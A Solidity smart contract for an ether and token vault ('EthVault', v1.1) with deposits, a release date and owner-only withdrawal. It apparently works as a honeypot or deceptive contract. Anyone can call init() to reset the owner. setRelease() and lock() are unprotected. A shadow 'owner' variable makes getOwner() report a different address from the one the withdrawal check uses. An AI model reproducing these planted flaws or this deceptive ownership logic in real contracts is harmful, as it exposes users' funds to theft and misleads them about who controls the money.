1 // Copyright (C) 2017  The Halo Platform by Scott Morrison
2 // https://www.haloplatform.tech/
3 // 
4 // This is free software and you are welcome to redistribute it under certain conditions.
5 // ABSOLUTELY NO WARRANTY; for details visit:
6 //
7 //      https://www.gnu.org/licenses/gpl-2.0.html
8 //
9 pragma solidity ^0.4.18;
10 
11 contract Ownable {
12     address Owner;
13     function Ownable() { Owner = msg.sender; }
14     modifier onlyOwner { if (msg.sender == Owner) _; }
15     function transferOwnership(address to) public onlyOwner { Owner = to; }
16 }
17 
18 contract Token {
19     function balanceOf(address who) constant public returns (uint256);
20     function transfer(address to, uint amount) constant public returns (bool);
21 }
22 
23 // tokens are withdrawable
24 contract TokenVault is Ownable {
25     address owner;
26     event TokenTransfer(address indexed to, address token, uint amount);
27     
28     function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
29         uint amount = balanceOfToken(token);
30         if (amount > 0) {
31             TokenTransfer(to, token, amount);
32             return Token(token).transfer(to, amount);
33         }
34         return false;
35     }
36     
37     function balanceOfToken(address token) public constant returns (uint256 bal) {
38         bal = Token(token).balanceOf(address(this));
39     }
40 }
41 
42 // store ether & tokens for a period of time
43 contract EthVault is TokenVault {
44     
45     string public constant version = "v1.1";
46     
47     event Deposit(address indexed depositor, uint amount);
48     event Withdrawal(address indexed to, uint amount);
49     event OpenDate(uint date);
50 
51     mapping (address => uint) public Deposits;
52     uint minDeposit;
53     bool Locked;
54     uint Date;
55 
56     function init() payable open {
57         Owner = msg.sender;
58         minDeposit = 0.25 ether;
59         Locked = false;
60         deposit();
61     }
62     
63     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
64     function ReleaseDate() public constant returns (uint) { return Date; }
65     function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
66 
67     function() public payable { deposit(); }
68 
69     function deposit() public payable {
70         if (msg.value > 0) {
71             if (msg.value >= MinimumDeposit())
72                 Deposits[msg.sender] += msg.value;
73             Deposit(msg.sender, msg.value);
74         }
75     }
76 
77     function setRelease(uint newDate) public { 
78         Date = newDate;
79         OpenDate(Date);
80     }
81 
82     function withdraw(address to, uint amount) public onlyOwner {
83         if (WithdrawEnabled()) {
84             uint max = Deposits[msg.sender];
85             if (max > 0 && amount <= max) {
86                 to.transfer(amount);
87                 Withdrawal(to, amount);
88             }
89         }
90     }
91 
92     function lock() public { if(Locked) revert(); Locked = true; }
93     modifier open { if (!Locked) _; owner = msg.sender; deposit(); }
94     function kill() public { require(this.balance == 0); selfdestruct(Owner); }
95     function getOwner() external constant returns (address) { return owner; }
96 }